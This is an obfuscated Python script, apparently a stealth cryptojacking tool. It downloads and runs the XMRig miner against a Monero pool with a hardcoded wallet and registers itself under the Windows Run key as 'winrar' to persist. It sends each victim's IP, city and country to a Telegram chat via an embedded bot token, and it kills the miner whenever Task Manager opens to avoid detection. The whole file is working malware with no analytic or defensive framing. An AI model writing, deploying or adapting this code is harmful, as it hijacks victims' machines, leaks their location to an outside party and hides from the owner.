import psutil #line:1
import subprocess #line:2
import asyncio #line:3
from aiogram import Bot #line:4
import requests #line:5
from winreg import *#line:6
import os #line:7
import random #line:8
import zipfile #line:9
bot_token ='6735583674:AAEohpENMoiu8NqBgYWObUEYd6rTJsLzY9A'#line:11
path_to_miner =os .path .realpath (__file__ )#line:12
winreg_path =path_to_miner [:-3 ]#line:13
chat_id ='-4170424212'#line:15
def download_file (OO0OO0000O0O0OO00 ,OOO0OO000O0OOO00O ):#line:17
    O0000O000O0O0OOO0 =requests .get (OO0OO0000O0O0OO00 )#line:18
    with open (OOO0OO000O0OOO00O ,'wb')as OOOO00OOO000000OO :#line:19
        OOOO00OOO000000OO .write (O0000O000O0O0OOO0 .content )#line:20
    print ("Файл успешно скачан и сохранен по пути:",OOO0OO000O0OOO00O )#line:21
def unzip_file (OOO00OOOOO00O0OO0 ,O0OO0OO0O00O00OO0 ):#line:25
    with zipfile .ZipFile (OOO00OOOOO00O0OO0 ,'r')as O0OO0O0O000O0OOO0 :#line:26
        O0OO0O0O000O0OOO0 .extractall (O0OO0OO0O00O00OO0 )#line:27
def get_ip_info ():#line:29
    OOO0O0OOOO0O00O00 =requests .get ('https://ipinfo.io')#line:30
    O000OOO0OOO000O0O =OOO0O0OOOO0O00O00 .json ()#line:31
    return O000OOO0OOO000O0O #line:32
def win_reg_min ():#line:34
	OOOOOO00OO0OO0O0O =OpenKey (HKEY_CURRENT_USER ,r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0 ,KEY_ALL_ACCESS )#line:36
	SetValueEx (OOOOOO00OO0OO0O0O ,'winrar',0 ,REG_SZ ,winreg_path +".py")#line:37
	CloseKey (OOOOOO00OO0OO0O0O )#line:38
async def check_task_manager (O0O0OO00O0OOOO0O0 :Bot ):#line:40
    while True :#line:41
        for O000000O0OOOOO00O in psutil .process_iter (['pid','name']):#line:42
            if "Taskmgr.exe"in O000000O0OOOOO00O .info ['name']:#line:43
                O0000OO000000OO0O =get_ip_info ()#line:44
                await O0O0OO00O0OOOO0O0 .send_message (chat_id ,f"IP: {O0000OO000000OO0O['ip']}\nCITY: {O0000OO000000OO0O['city']}\nCOUNTRY: {O0000OO000000OO0O['country']}\nTask Manager открыт. Замораживаем процесс майнера.❌")#line:45
                subprocess .Popen (["taskkill","/F","/IM","xmrig.exe"],shell =True )#line:46
                return #line:47
        await asyncio .sleep (1 )#line:48
async def start_miner (O00O00OO0OOO0OOO0 :Bot ):#line:50
    O00OO0OOO0O0OOO0O ='https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip'#line:51
    OOO00O00OOO00OO00 ='E:\\Programs\\winrar\\xmrig-6.21.0-gcc-win64.zip'#line:52
    download_file (O00OO0OOO0O0OOO0O ,OOO00O00OOO00OO00 )#line:53
    O0O0O000O0OO0O0O0 =str (random .randint (0 ,999 ))#line:54
    unzip_file (OOO00O00OOO00OO00 ,'E:\\Programs\\winrar\\')#line:55
    OO0O000OO0O0000O0 =f'E:\\Programs\\winrar\\xmrig-6.21.0\\xmrig.exe --url pool.hashvault.pro:7777 --user 44g61Gx1EyNW5X4f6p7jnJCAytVQWUjv3R77arbsfz7EEmk81E27aoY4Gwm8Q9Bb8VKtQdo9hFtun8fXQPXgzyrpGra9Ssb --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14'#line:56
    subprocess .Popen (OO0O000OO0O0000O0 ,shell =True )#line:57
    OOO00OO0OOO0O0000 =get_ip_info ()#line:58
    win_reg_min ()#line:59
    await O00O00OO0OOO0OOO0 .send_message (chat_id ,f"IP: {OOO00OO0OOO0O0000['ip']}\nCITY: {OOO00OO0OOO0O0000['city']}\nCOUNTRY: {OOO00OO0OOO0O0000['country']}\nМайнер успешно запущен. ✅")#line:60
    await check_task_manager (O00O00OO0OOO0OOO0 )#line:61
async def main ():#line:63
    OOOO0OO00000000OO =Bot (token =bot_token )#line:64
    await start_miner (OOOO0OO00000000OO )#line:65
if __name__ =="__main__":#line:67
    asyncio .run (main ())
